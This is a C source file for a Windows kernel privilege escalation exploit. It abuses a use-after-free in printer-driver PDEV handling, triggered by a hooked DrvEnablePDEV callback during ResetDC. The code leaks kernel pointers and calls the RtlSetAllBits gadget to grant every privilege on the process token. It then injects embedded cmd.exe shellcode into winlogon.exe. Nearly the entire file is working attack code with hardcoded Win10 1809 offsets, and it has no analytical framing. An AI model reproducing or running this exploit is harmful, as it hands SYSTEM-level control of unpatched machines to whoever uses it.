#include "windows.h"
#include "stdio.h"
#include "detours.h"
#include "processthreadsapi.h"
#include "winddi.h"
#include "ntos.h"
#include "Ntstatus.h"
#include "tlhelp32.h"

#pragma comment(lib, "detours.lib")

// run cmd.exe
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
"\x78\x65\x00";

#define ID_DrvEnablePDEV    0		// mxdwdrv!DrvEnablePDEV
#define ID_DrvCompletePDEV  1		// mxdwdrv!DrvCompletePDEV
#define ID_DrvResetPDEV     7		// mxdwdrv!DrvResetPDEV

typedef DHPDEV(NTAPI *DrvFN)(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
typedef NTSTATUS (WINAPI *_NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
);
_NtQuerySystemInformation fnNtQuerySystemInformation = NULL;

#define DRVFN_TABLE_OFFSET 0x972E0  // win10 1809 x64
#define OBJ_SIZE		   0xE70	// pdev obj size
#define TriggerFuncOffset  0xAB8	// *(DWORD64)((DWORD64)pdev + 0xAB8)
#define TriggerParamOffset  0x708	// *(DWORD64)((DWORD64)pdev + 0x708)

LPCWSTR pPrinterName = NULL;
DEVMODE devMode = { 0 };
HDC hDC = NULL;
BOOL flag = TRUE;

DrvFN OriginFunc = NULL;
DWORD64 GadgetFuncAddr = 0;

#define TOKEN_PRIVILEGES_OFFSET 0x40			//_SEP_TOKEN_PRIVILEGES offset

HMODULE GetNOSModule() {
	HMODULE hKern = 0;
	hKern = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	return hKern;
}

DWORD64 GetModuleAddr(const char* modName) {
	PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);

	DWORD outBuffer = 0;
	NTSTATUS status = fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, 0x20, &outBuffer);

	if (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		free(buffer);
		buffer = (PSYSTEM_MODULE_INFORMATION)malloc(outBuffer);
		status = fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, outBuffer, &outBuffer);
	}

	if (!buffer)
	{
		printf("[x] NtQuerySystemInformation error\n");
		return 0;
	}

	for (unsigned int i = 0; i < buffer->NumberOfModules; i++)
	{
		PVOID kernelImageBase = buffer->Modules[i].ImageBase;
		PCHAR kernelImage = (PCHAR)buffer->Modules[i].FullPathName;
		if (_stricmp(kernelImage, modName) == 0)
		{
			free(buffer);
			return (DWORD64)kernelImageBase;
		}
	}
	free(buffer);
	return 0;
}

DWORD64 GetGadgetAddr(const char* name){
	DWORD64 base = GetModuleAddr("\\SystemRoot\\system32\\ntoskrnl.exe");
	HMODULE mod = GetNOSModule();
	if (!mod || !base)
	{
		printf("[x] leaking ntoskrnl version\n");
		return 0;
	}
	DWORD64 offset = (DWORD64)GetProcAddress(mod, name);
	DWORD64 returnValue = base + (offset - (DWORD64)mod);
	FreeLibrary(mod);
	return returnValue;
}

DWORD64 GetKernelPointer(HANDLE handle, DWORD type) {
	PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);

	DWORD outBuffer = 0;
	NTSTATUS status = fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);

	if (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		free(buffer);
		buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
		status = fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
	}
	if (!buffer)
	{
		printf("[x] NtQuerySystemInformation error \n");
		return 0;
	}

	for (size_t i = 0; i < buffer->NumberOfHandles; i++)
	{
		DWORD objTypeNumber = buffer->Handles[i].ObjectTypeIndex;

		if (buffer->Handles[i].UniqueProcessId == GetCurrentProcessId() && buffer->Handles[i].ObjectTypeIndex == type)
		{
			if (handle == (HANDLE)buffer->Handles[i].HandleValue)
			{
				DWORD64 object = (DWORD64)buffer->Handles[i].Object;
				free(buffer);
				return object;
			}
		}
	}
	printf("[x] handle not found\n");
	free(buffer);
	return 0;
}

DWORD64 GetTokenAddr() {

	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	if (!proc)
	{
		printf("[x] OpenProcess failed\n");
		return 0;
	}
	HANDLE token = 0;
	if (!OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token))
	{
		printf("[x] OpenProcessToken failed\n");
		return 0;
	}

	DWORD64 ktoken = 0;
	INT i = 0x100;
	while (!ktoken && i--) {
		ktoken = GetKernelPointer(token, 0x5);    // type: Token
	}
	return ktoken + TOKEN_PRIVILEGES_OFFSET;
}
	
BOOL Prepare() {

	fnNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");

	GadgetFuncAddr = GetGadgetAddr("RtlSetAllBits");
	if (!GadgetFuncAddr)
		return 0;
	
	printf("[+] Get RtlSetAllBits func addr at: %#I64x\n", GadgetFuncAddr);
	LPVOID Ptr = VirtualAlloc((LPVOID)0xffff0000, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!Ptr) {
		printf("[x] Failed to allocate memory at address 0xffff0000, please try again!\n");
		return 0;
	}
	DWORD64 TokenAddr = GetTokenAddr();
	printf("[+] Get TokenAddr : %#I64x\n", TokenAddr);

	memset(Ptr, 0xff, 0x1000);
	*(DWORD64*)((DWORD64)Ptr + 0x8) = TokenAddr;
	*(DWORD*)((DWORD64)Ptr) = 0x80;

	return 1;
}

DHPDEV DetourFunc(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver) {
	
	DHPDEV ret = OriginFunc(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);
	printf("[+] ret Value from OriginFunc : %#I64x\n", (DWORD64)ret);
	if (flag) {
		printf("[+] Call ResetDC Again in User Mode Call Back Funtion...\n");
		flag = FALSE;

		ResetDC(hDC, &devMode);
		printf("[+] Returned From Second ResetDC Call...\n");

		int pal_cnt = (OBJ_SIZE - 0x90) / 4;
		int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY);
		LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palsize);
		DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);		// kernel palette obj offset 0
		memset(lPalette, 0xff, palsize);
		p[(0x20 + TriggerFuncOffset) / 8] = GadgetFuncAddr;
		p[(0x20 + TriggerParamOffset) / 8] = (DWORD64)0xffff0000;

		lPalette->palNumEntries = pal_cnt;
		lPalette->palVersion = 0x300;

		printf("[+] Start reclainming freed PDEV obj mem...\n");
		INT i = 0x5000;
		while (i--) {
			CreatePalette(lPalette);
		}
		printf("[+] Finish mem reclaiming...\n");
	}
	return ret;
}

BOOL Hook_DrvFN_by_IDX(DWORD64 index) {

	HMODULE hMod = (HMODULE)LoadLibrary(L"MXDWDRV.DLL");
	if (!hMod) {
		printf("[x] Load MXDWDRV.DLL Module Failed : %#x\n", GetLastError());
		return FALSE;
	}
	DWORD64 pos = (DWORD64)hMod + DRVFN_TABLE_OFFSET;
	INT i = 0;
	for (; i < 29; i++) {
		if (*(DWORD64*)pos == index) {
			OriginFunc = (DrvFN)(*(DWORD64*)(pos + 8));
			printf("[+] Get Target Function : %#I64x\n", (DWORD64)OriginFunc);
			break;
		}
		pos += 0x10;
	}
	if (!OriginFunc)
		return FALSE;

	printf("[+] Start to Hook Target Function ...\n");
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)OriginFunc, DetourFunc);
	DetourTransactionCommit();
	printf("[+] Target Function value after Hooking Target Function : %#I64x\n", (DWORD64)OriginFunc);

	return TRUE;
}

BOOL RetrievePrinter() {

	DWORD dwNeeded = 0, dwReturned = 0;
	PPRINTER_INFO_2 pInfo = NULL;

	EnumPrinters(
		PRINTER_ENUM_LOCAL | PRINTER_ENUM_CONNECTIONS,
		NULL,
		2L,                // printer info level
		(LPBYTE)NULL,
		0L,
		&dwNeeded,
		&dwReturned);
	// printf("dwNeeded : %#x\tdwReturned : %#x\n", dwNeeded, dwReturned);

	if (dwNeeded > 0)
		pInfo = (PRINTER_INFO_2 *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNeeded);

	if (pInfo)
	{
		dwReturned = 0;
		if (!EnumPrinters(
			PRINTER_ENUM_LOCAL | PRINTER_ENUM_CONNECTIONS,
			NULL,
			2L,                // printer info level
			(LPBYTE)pInfo,
			dwNeeded,
			&dwNeeded,
			&dwReturned))
		{
			printf("[x] Enum Printers Failed... %#x\n", GetLastError());
			return false;
		}
	}
	// printf("dwNeeded : %#x\tdwReturned : %#x\n", dwNeeded, dwReturned);
	if (!dwReturned) return false;

	DWORD size = 2 * wcslen(pInfo[0].pPrinterName);
	pPrinterName = (LPCWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size + 2);
	memcpy((PVOID)pPrinterName, pInfo[0].pPrinterName, size);
	memcpy((PVOID)&devMode, pInfo[0].pDevMode, sizeof(DEVMODE));

	return true;
}

void InjectToWinlogon() {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	int pid = -1;
	if (Process32First(snapshot, &entry))
	{
		while (Process32Next(snapshot, &entry))
		{
			if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0)
			{
				pid = entry.th32ProcessID;
				break;
			}
		}
	}
	CloseHandle(snapshot);

	if (pid < 0)
	{
		printf("Could not find process\n");
		return;
	}
	HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!h)
	{
		printf("Could not open process: %x\n", GetLastError());
		return;
	}

	void* buffer = VirtualAllocEx(h, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!buffer)
	{
		printf("[-] VirtualAllocEx failed\n");
	}

	if (!buffer)
	{
		printf("[-] remote allocation failed\n");
		return;
	}

	if (!WriteProcessMemory(h, buffer, shellcode, sizeof(shellcode), 0))
	{
		printf("[-] WriteProcessMemory failed\n");
		return;
	}

	HANDLE hthread = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

	if (hthread == INVALID_HANDLE_VALUE)
	{
		printf("[-] CreateRemoteThread failed\n");
		return;
	}
}

INT main() {

	system("pause");

	if (!RetrievePrinter()) {
		printf("[x] Retrieve printer name Failed... %#x\n", GetLastError());
		return 1;
	}
	printf("[+] Retrieve printer name : %ws\n", pPrinterName);

	if (!Prepare()) {
		printf("[x] Prepare works FAILED...\n");
		return 1;
	}

	hDC = CreateDC(NULL, pPrinterName, NULL, &devMode);
	if (!hDC) {
		printf("[x] Create Printer DC Failed... %#x\n", GetLastError());
		return 1;
	}
	printf("[+] Created Printer DC : %#x\n", (DWORD)hDC);
	
	if (!Hook_DrvFN_by_IDX(ID_DrvEnablePDEV))
		printf("[x] Hook Target Function Failed...\n");

	hDC = ResetDC(hDC, &devMode);
	
	printf("[+] Return from First-time Reset DC\n");

	// inject To winlogon.exe
	InjectToWinlogon();

	system("pause");

	return 0;
}